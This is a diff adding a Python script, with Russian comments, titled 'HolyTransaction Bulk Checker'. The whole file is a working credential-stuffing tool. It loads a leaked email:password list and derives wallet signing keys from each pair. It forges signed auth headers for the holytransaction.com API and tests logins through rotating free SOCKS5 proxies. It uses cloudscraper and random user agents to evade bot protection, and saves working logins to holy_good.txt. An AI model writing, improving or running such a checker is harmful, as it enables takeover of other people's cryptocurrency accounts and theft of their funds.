@@ -1,0 +1,198 @@
+import hashlib
+import hmac
+import time
+import cloudscraper
+import nacl.signing
+import os
+import random
+import requests
+import threading
+from concurrent.futures import ThreadPoolExecutor
+from colorama import init, Fore, Style
+
+init(autoreset=True)
+
+# --- НАСТРОЙКИ ---
+PROXY_URL = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"
+PROXY_REFRESH_INTERVAL = 120 
+RETRY_LIMIT = 20 
+
+stats = {"valid": 0, "bad_pass": 0, "not_found": 0, "errors": 0, "total_checked": 0, "start_index": 0}
+proxy_list = []
+last_proxy_update = 0
+
+proxy_lock = threading.Lock()
+print_lock = threading.Lock()
+file_lock = threading.Lock()
+stats_lock = threading.Lock()
+
+thread_local = threading.local()
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+]
+
+def get_scraper():
+    if not hasattr(thread_local, "scraper"):
+        thread_local.scraper = cloudscraper.create_scraper()
+    return thread_local.scraper
+
+def safe_print(text):
+    with print_lock:
+        print(text)
+
+def update_proxies():
+    global proxy_list, last_proxy_update
+    with proxy_lock:
+        if time.time() - last_proxy_update < PROXY_REFRESH_INTERVAL and proxy_list:
+            return
+        try:
+            r = requests.get(PROXY_URL, timeout=15)
+            if r.status_code == 200:
+                raw_list = r.text.splitlines()
+                proxy_list = [p.strip() for p in raw_list if p.strip()]
+                last_proxy_update = time.time()
+                safe_print(Fore.CYAN + f"[*] Список прокси обновлен: {len(proxy_list)} шт.")
+        except:
+            pass
+
+def get_wallet_key(login, password, salt_suffix):
+    salt = (login + salt_suffix).encode()
+    seed = hashlib.scrypt(password.encode(), salt=salt, n=2048, r=1, p=1, dklen=32)
+    sk = nacl.signing.SigningKey(seed)
+    return (seed + sk.verify_key.encode()).hex()
+
+def process_account(line, total_lines, progress_file):
+    if ':' not in line or '@' not in line: return
+    email_part, password = line.rsplit(':', 1)
+    login = email_part.split('@')[0]
+    
+    wk2 = get_wallet_key(login, password, "wallet2")
+    wk1 = get_wallet_key(login, password, "wallet")
+    
+    url_path = "user/getId"
+    params_sha2 = "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="
+    
+    scraper = get_scraper()
+    result = "FAILED"
+    p_used = None
+
+    for attempt in range(1, RETRY_LIMIT + 1):
+        with proxy_lock:
+            if not proxy_list: break
+            current_proxy = random.choice(proxy_list)
+        
+        proxies = {"http": f"socks5://{current_proxy}", "https": f"socks5://{current_proxy}"}
+        ts = str(int(time.time() * 1000))
+        auth_str = f"{login},{ts},{url_path},{params_sha2}"
+        sig_new = hmac.new(wk2.encode(), auth_str.encode(), hashlib.sha1).hexdigest()
+        sig_old = hmac.new(wk1.encode(), auth_str.encode(), hashlib.sha1).hexdigest()
+
+        try:
+            headers = {
+                "User-Agent": random.choice(USER_AGENTS),
+                "x-auth": f"APIAuth {sig_new}",
+                "x-auth-old": f"APIAuth {sig_old}",
+                "x-timestamp": ts,
+                "x-username": login,
+                "X-Requested-With": "XMLHttpRequest"
+            }
+            resp = scraper.post("https://holytransaction.com/api/user/getId", 
+                                headers=headers, proxies=proxies, timeout=15)
+
+            if resp.status_code == 200:
+                # ФИКС ЛОЖНЫХ ГУДОВ: Проверяем содержимое ответа
+                if '"id":' in resp.text and '"token":' in resp.text:
+                    result = "VALID"
+                    p_used = current_proxy
+                    break
+                else:
+                    # Если 200 OK, но данных нет - это плохая прокся
+                    continue
+            elif resp.status_code == 401:
+                result = "INVALID_PASS"; p_used = current_proxy; break
+            elif resp.status_code == 404:
+                result = "NOT_FOUND"; p_used = current_proxy; break
+            else:
+                continue
+        except:
+            continue
+
+    with stats_lock:
+        stats["total_checked"] += 1
+        current_idx = stats["start_index"] + stats["total_checked"]
+        with open(progress_file, 'w') as pf:
+            pf.write(str(current_idx))
+
+    p_info = Fore.LIGHTBLACK_EX + f" | Proxy: {p_used}" if p_used else ""
+    
+    if result == "VALID":
+        with stats_lock: stats["valid"] += 1
+        safe_print(f"[{current_idx}/{total_lines}] " + Fore.GREEN + f"[GOOD] {login}:{password}" + p_info)
+        with file_lock:
+            with open("holy_good.txt", "a") as f: f.write(f"{line}\n")
+    elif result == "INVALID_PASS":
+        safe_print(f"[{current_idx}/{total_lines}] " + Fore.YELLOW + f"[BAD_PASS] {login}" + p_info)
+    elif result == "NOT_FOUND":
+        safe_print(f"[{current_idx}/{total_lines}] " + Fore.WHITE + f"[NOT_FOUND] {login}" + p_info)
+    else:
+        with stats_lock: stats["errors"] += 1
+        safe_print(f"[{current_idx}/{total_lines}] " + Fore.RED + f"[FAILED] {login}" + p_info)
+
+def update_title(total):
+    while (stats["start_index"] + stats["total_checked"]) < total:
+        curr = stats["start_index"] + stats["total_checked"]
+        title = f"Holy Resume: {curr}/{total} | Goods: {stats['valid']} | Proxies: {len(proxy_list)}"
+        if os.name == 'nt':
+            import ctypes
+            ctypes.windll.kernel32.SetConsoleTitleW(title)
+        time.sleep(1)
+
+def main():
+    print(Fore.CYAN + Style.BRIGHT + "=== HolyTransaction Bulk Checker v9 (Anti-Fake Fix) ===")
+    
+    file_path = input("Перетащите файл с базой: ").strip().strip('"').strip("'")
+    if not os.path.exists(file_path): return
+
+    base_name = os.path.basename(file_path)
+    progress_file = f"progress_{base_name}.txt"
+    start_from = 0
+
+    if os.path.exists(progress_file):
+        with open(progress_file, 'r') as f:
+            try:
+                start_from = int(f.read().strip())
+                choice = input(Fore.YELLOW + f"[*] Продолжить с {start_from}? (Y/n): ").lower()
+                if choice == 'n': start_from = 0
+            except: start_from = 0
+
+    thread_count = int(input("Введите количество потоков (10-40): ").strip())
+
+    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+        all_lines = [line.strip() for line in f if line.strip()]
+    
+    total = len(all_lines)
+    stats["start_index"] = start_from
+    work_lines = all_lines[start_from:]
+
+    update_proxies()
+    threading.Thread(target=update_title, args=(total,), daemon=True).start()
+
+    def proxy_refresher():
+        while (stats["start_index"] + stats["total_checked"]) < total:
+            time.sleep(120)
+            update_proxies()
+    threading.Thread(target=proxy_refresher, daemon=True).start()
+
+    with ThreadPoolExecutor(max_workers=thread_count) as executor:
+        for line in work_lines:
+            executor.submit(process_account, line, total, progress_file)
+
+    if os.path.exists(progress_file): os.remove(progress_file)
+    print(Fore.CYAN + f"\nГотово! Найдено гудов: {stats['valid']}")
+    input()
+
+if __name__ == "__main__":
+    main()
